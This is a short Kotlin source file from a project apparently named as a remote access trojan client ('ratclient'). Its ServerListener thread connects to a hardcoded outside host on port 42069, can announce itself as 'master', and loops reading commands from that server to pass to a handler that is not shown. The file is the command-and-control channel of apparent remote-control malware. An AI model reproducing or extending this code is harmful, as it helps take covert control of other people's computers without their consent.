package net.x123dev.ratclient


import net.x123dev.ratclient.modules.displayInfoDialog
import java.io.DataInputStream
import java.io.DataOutputStream
import java.lang.Exception
import java.net.InetAddress
import java.net.Socket

class ServerListener : Thread() {

    lateinit var dOut: DataOutputStream
    lateinit var dIn: DataInputStream

    lateinit var socket: Socket
    val port: Int = 42069

    override fun run(){
        socket = Socket("x123dev.net",42069)

        dOut = DataOutputStream(socket.getOutputStream())
        dIn = DataInputStream(socket.getInputStream())
        println("connected to IP:${socket.inetAddress.toString()}")

        if(ismaster)
            sendMessage("iammaster;")

        try {
            while (true) {
                handleIncoming(dIn.readUTF())
            }
        }catch (e: Exception){
            e.printStackTrace()
            println("connection to server terminated");
        }
    }

    fun sendMessage(msg:String){
        try {
            dOut.writeUTF(msg)
            dOut.flush()
        }catch (e: Exception){
            println("connection to server terminated");
        }
    }

}